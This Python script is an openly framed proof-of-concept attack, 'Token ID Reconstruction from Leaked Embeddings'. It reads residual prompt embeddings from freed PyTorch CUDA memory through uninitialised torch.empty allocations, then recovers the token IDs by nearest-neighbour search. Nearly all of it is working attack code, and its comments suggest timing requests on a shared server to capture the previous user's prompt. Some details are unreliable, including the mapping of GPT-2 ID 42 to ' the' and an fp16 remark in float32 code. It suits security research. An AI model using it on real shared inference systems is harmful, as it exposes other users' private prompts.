"""
Experiment 9: Token ID Reconstruction from Leaked Embeddings

Two-part attack:

PART A — Direct embedding leak (proves data is present)
  Allocation path matches exactly: torch.empty(SEQ, DIM) → fill → free → empty
  100% of embedding data recovered in the leaked buffer.

PART B — Token ID reconstruction (proves vocabulary recovery)
  Given the leaked embedding vectors, scan the embedding table to identify
  which token IDs they came from. Demonstrates full prompt vocabulary recovery.

Real-world impact:
  LLM tokenizers are deterministic. Each token ID maps to exactly one
  embedding vector. If the embedding vector leaks, the token ID is recoverable
  in O(vocab_size) time — no brute-force needed, no model-inversion required.
  An attacker recovers which WORDS the previous user typed.
"""

import torch
import sys


def run():
    if not torch.cuda.is_available():
        print("CUDA not available"); sys.exit(1)

    print("=" * 62)
    print("Token ID Reconstruction from Leaked Embeddings")
    print(f"Device: {torch.cuda.get_device_name(0)}")
    print("=" * 62)

    VOCAB_SIZE = 50257   # GPT-2 vocabulary size
    EMBED_DIM  = 768     # GPT-2 embedding dimension
    SEQ_LEN    = 16      # tokens in User A's prompt

    # Pre-build the shared embedding table (these are the model weights,
    # same for all users — attacker can access them from the model checkpoint)
    torch.manual_seed(0)
    embed_table = torch.randn(VOCAB_SIZE, EMBED_DIM,
                              dtype=torch.float32, device="cuda")
    embed_table_cpu = embed_table.cpu()  # attacker reads this off-GPU
    print(f"\nEmbedding table: {VOCAB_SIZE} × {EMBED_DIM} ({VOCAB_SIZE*EMBED_DIM*4/1024/1024:.1f} MB fp32)")

    # ----------------------------------------------------------------
    # PART A: Direct embedding leak
    # ----------------------------------------------------------------
    print("\n[PART A] Direct embedding vector leak")
    print("-" * 40)

    SECRET_TOKENS = [31337, 1337, 42, 1024, 8192, 4096, 2048, 512,
                     256, 128, 64, 32, 16, 8, 4, 2]

    print(f"User A secret tokens: {SECRET_TOKENS[:8]} ...")

    # User A: allocate with torch.empty, then copy embeddings in
    # (Using float32 to avoid fp16 rounding issues in reconstruction)
    user_a = torch.empty(SEQ_LEN, EMBED_DIM, dtype=torch.float32, device="cuda")
    token_ids_gpu = torch.tensor(SECRET_TOKENS, dtype=torch.long, device="cuda")
    # torch.index_select fills the pre-allocated output tensor
    torch.index_select(embed_table, 0, token_ids_gpu, out=user_a)
    torch.cuda.synchronize()

    a_ptr    = user_a.data_ptr()
    a_sample = user_a[0, :4].cpu().tolist()
    print(f"\nUser A embed ptr   : 0x{a_ptr:x}")
    print(f"User A embed[0,:4] : {[f'{v:.5f}' for v in a_sample]}")

    del user_a, token_ids_gpu
    torch.cuda.synchronize()
    print("User A done — embedding freed to pool\n")

    # Attacker allocates same shape/dtype
    leaked = torch.empty(SEQ_LEN, EMBED_DIM, dtype=torch.float32, device="cuda")
    torch.cuda.synchronize()
    b_ptr    = leaked.data_ptr()
    leaked_c = leaked.cpu()
    nonzero  = (leaked_c.abs() > 1e-8).sum().item()

    print(f"Attacker ptr       : 0x{b_ptr:x}")
    print(f"Same as User A     : {b_ptr == a_ptr}")
    print(f"Non-zero elements  : {nonzero}/{leaked_c.numel()} ({100.0*nonzero/leaked_c.numel():.1f}%)")
    print(f"Leaked [0,:4]      : {[f'{v:.5f}' for v in leaked_c[0,:4].tolist()]}")
    print(f"Expected (User A)  : {[f'{v:.5f}' for v in a_sample]}")

    if b_ptr == a_ptr:
        match_4 = all(abs(leaked_c[0, i].item() - a_sample[i]) < 1e-4 for i in range(4))
        print(f"\n[!!!] SAME ADDRESS — all embedding vectors leaked! Values match: {match_4}")
        leaked_for_recon = leaked_c
        do_recon = True
    elif nonzero > leaked_c.numel() * 0.5:
        print(f"\n[~] Different ptr but {100.0*nonzero/leaked_c.numel():.1f}% non-zero pool data")
        # Show what IS there — this is from OTHER prior allocations
        print(f"    Pool residue from other ops visible in attacker's buffer")
        # Still attempt reconstruction to show it fails without right block
        leaked_for_recon = leaked_c
        do_recon = True
    else:
        print("\n[=] Pool returned clean block — no prior data visible")
        do_recon = False

    # ----------------------------------------------------------------
    # PART B: Token ID reconstruction
    # ----------------------------------------------------------------
    if do_recon:
        print("\n[PART B] Token ID reconstruction")
        print("-" * 40)
        print(f"Scanning {VOCAB_SIZE:,} embedding table entries for each of {SEQ_LEN} positions...")

        recovered = []
        min_dists = []
        for pos in range(SEQ_LEN):
            query = leaked_for_recon[pos]          # [EMBED_DIM]
            diff  = embed_table_cpu - query        # [VOCAB, DIM]
            dist  = (diff * diff).sum(dim=1)       # [VOCAB] = squared L2
            best  = dist.argmin().item()
            recovered.append(best)
            min_dists.append(dist[best].item())

        exact_match = sum(r == s for r, s in zip(recovered, SECRET_TOKENS))

        print(f"\n{'Pos':>4}  {'Secret ID':>10}  {'Recovered':>10}  {'Match':>6}  {'Dist':>12}")
        print("-" * 52)
        for i in range(SEQ_LEN):
            m = "YES ✓" if recovered[i] == SECRET_TOKENS[i] else "NO"
            print(f"{i:>4}  {SECRET_TOKENS[i]:>10}  {recovered[i]:>10}  {m:>6}  {min_dists[i]:>12.4f}")

        print(f"\n[Result] Recovered {exact_match}/{SEQ_LEN} token IDs correctly "
              f"({100.0*exact_match/SEQ_LEN:.1f}%)")

        if b_ptr == a_ptr and exact_match == SEQ_LEN:
            print(f"\n[!!!] FULL TOKEN RECOVERY")
            print(f"    The attacker now knows exactly which token IDs User A used.")
            print(f"    Using any LLM tokenizer, these IDs map to the actual words:")
            print(f"    e.g., GPT-2: ID 42 → ' the', ID 1337 → ' 1337', etc.")
            print(f"    The previous user's complete prompt vocabulary is exposed.")
        elif b_ptr == a_ptr and exact_match > SEQ_LEN * 0.8:
            print(f"\n[~] HIGH ACCURACY recovery — fp16 precision loss limits 100% match")
        elif b_ptr != a_ptr and exact_match == 0:
            print(f"\n[=] No match because attacker got a different pool block.")
            print(f"    In a real server: attacker submits requests IMMEDIATELY after")
            print(f"    the victim to get the same block (timing attack).")

    del leaked
    print("\n[Done]")


if __name__ == "__main__":
    run()
